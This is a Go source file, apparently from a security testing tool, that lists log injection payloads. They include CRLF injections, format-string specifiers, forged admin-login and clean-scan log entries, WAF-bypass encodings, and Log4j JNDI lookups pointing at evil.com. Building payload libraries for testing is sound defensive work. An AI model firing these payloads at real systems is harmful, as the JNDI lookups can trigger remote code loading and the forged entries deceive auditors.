// Package loginj provides log injection test payloads.
// Payloads are categorized by:
//   - Category (CRLF injection, Format string, Fake log entries)
//   - Injection vectors through commonly logged headers
//   - CRLF sequences, format specifiers, and log entry forgery
package loginj

// Category represents a log injection payload category.
type Category string

const (
	// CRLF represents CRLF-based log injection payloads.
	CRLF Category = "crlf"
	// FormatString represents format string injection payloads.
	FormatString Category = "format_string"
	// FakeEntry represents fake log entry injection payloads.
	FakeEntry Category = "fake_entry"
	// Generic represents generic log injection payloads.
	Generic Category = "generic"
)

// Payload represents a log injection test payload.
type Payload struct {
	Value       string
	Category    Category
	Description string
	WAFBypass   bool
}

// GetPayloads returns payloads for a specific category.
func GetPayloads(category Category) []Payload {
	switch category {
	case CRLF:
		return crlfPayloads
	case FormatString:
		return formatStringPayloads
	case FakeEntry:
		return fakeEntryPayloads
	default:
		return genericPayloads
	}
}

// GetAllPayloads returns all payloads for all categories.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, crlfPayloads...)
	all = append(all, formatStringPayloads...)
	all = append(all, fakeEntryPayloads...)
	all = append(all, genericPayloads...)
	return all
}

// GetInjectionHeaders returns header names commonly logged by applications.
func GetInjectionHeaders() []string {
	return injectionHeaders
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads() []Payload {
	all := GetAllPayloads()
	var result []Payload
	for _, p := range all {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// DeduplicatePayloads removes duplicate payloads based on Value and Category.
func DeduplicatePayloads(payloads []Payload) []Payload {
	seen := make(map[string]bool)
	var result []Payload
	for _, p := range payloads {
		key := p.Value + "|" + string(p.Category)
		if !seen[key] {
			seen[key] = true
			result = append(result, p)
		}
	}
	return result
}

// Headers commonly logged by web applications and frameworks.
var injectionHeaders = []string{
	"User-Agent",
	"Referer",
	"X-Forwarded-For",
	"X-Real-IP",
	"X-Client-IP",
	"Cookie",
	"Authorization",
	"Origin",
	"Host",
}

// CRLF-based log injection payloads.
var crlfPayloads = []Payload{
	{Value: "test\r\nINJECTED_LOG_ENTRY", Category: CRLF, Description: "Basic CRLF newline injection"},
	{Value: "test\r\n\r\n<script>alert(1)</script>", Category: CRLF, Description: "CRLF with HTTP response splitting"},
	{Value: "test%0d%0aINJECTED_LOG_ENTRY", Category: CRLF, Description: "URL-encoded CRLF injection"},
	{Value: "test%0d%0a%0d%0aINJECTED", Category: CRLF, Description: "Double URL-encoded CRLF injection"},
	{Value: "test\\r\\nINJECTED_LOG_ENTRY", Category: CRLF, Description: "Escaped CRLF injection"},
	{Value: "test\nINJECTED_LOG_ENTRY", Category: CRLF, Description: "LF-only newline injection"},
	{Value: "test%0aINJECTED_LOG_ENTRY", Category: CRLF, Description: "URL-encoded LF-only injection"},
	{Value: "test\u2028INJECTED_LOG_ENTRY", Category: CRLF, Description: "Unicode line separator injection"},
}

// Format string injection payloads.
var formatStringPayloads = []Payload{
	{Value: "%s%s%s%s%s%s%s%s%s%n", Category: FormatString, Description: "Format string with %s and %n specifiers"},
	{Value: "%x%x%x%x%x%x%x%x", Category: FormatString, Description: "Format string hex dump specifiers"},
	{Value: "%n%n%n%n%n%n%n%n", Category: FormatString, Description: "Format string write specifiers"},
	{Value: "%08x.%08x.%08x.%08x", Category: FormatString, Description: "Padded hex format string"},
	{Value: "AAAA%p%p%p%p%p", Category: FormatString, Description: "Pointer format string with padding"},
	{Value: "%d%d%d%d%d%d%d%d", Category: FormatString, Description: "Integer format string specifiers"},
	{Value: "${jndi:ldap://evil.com/a}", Category: FormatString, Description: "Log4j JNDI lookup format string"},
	{Value: "${env:PATH}", Category: FormatString, Description: "Environment variable lookup format string"},
}

// Fake log entry injection payloads.
var fakeEntryPayloads = []Payload{
	{Value: "\r\n[INFO] 2025-01-01 admin login successful from 127.0.0.1", Category: FakeEntry, Description: "Fake successful admin login entry"},
	{Value: "\r\n[INFO] 2025-01-01 User admin authenticated successfully", Category: FakeEntry, Description: "Fake admin authentication entry"},
	{Value: "\r\n[WARN] 2025-01-01 Security scan completed - no issues found", Category: FakeEntry, Description: "Fake security scan clean entry"},
	{Value: "\r\n[ERROR] 2025-01-01 Database backup completed successfully", Category: FakeEntry, Description: "Fake database backup entry"},
	{Value: "\r\n127.0.0.1 - admin [01/Jan/2025:00:00:00] \"GET /admin HTTP/1.1\" 200", Category: FakeEntry, Description: "Fake Apache access log entry"},
	{Value: "\n{\"level\":\"info\",\"user\":\"admin\",\"action\":\"login\",\"status\":\"success\"}", Category: FakeEntry, Description: "Fake JSON structured log entry"},
}

// Generic log injection payloads.
var genericPayloads = []Payload{
	{Value: "test\r\n[CRITICAL] System compromised", Category: Generic, Description: "Generic CRLF with fake critical entry"},
	{Value: "%s%n%x combined with \r\nFAKE_ENTRY", Category: Generic, Description: "Combined format string and CRLF"},
	{Value: "${jndi:ldap://evil.com/}\r\nFake log entry", Category: Generic, Description: "Log4j JNDI with fake entry"},
	{Value: "test\x00\r\nINJECTED", Category: Generic, Description: "Null byte followed by CRLF injection"},

	// WAF bypass variants
	{Value: "test%0D%0AINJECTED_LOG_ENTRY", Category: Generic, Description: "Uppercase URL-encoded CRLF bypass", WAFBypass: true},
	{Value: "test%E5%98%8A%E5%98%8DINJECTED", Category: Generic, Description: "UTF-8 encoded CRLF bypass", WAFBypass: true},
	{Value: "test\r \nINJECTED_LOG_ENTRY", Category: Generic, Description: "CRLF with space between CR and LF", WAFBypass: true},
}
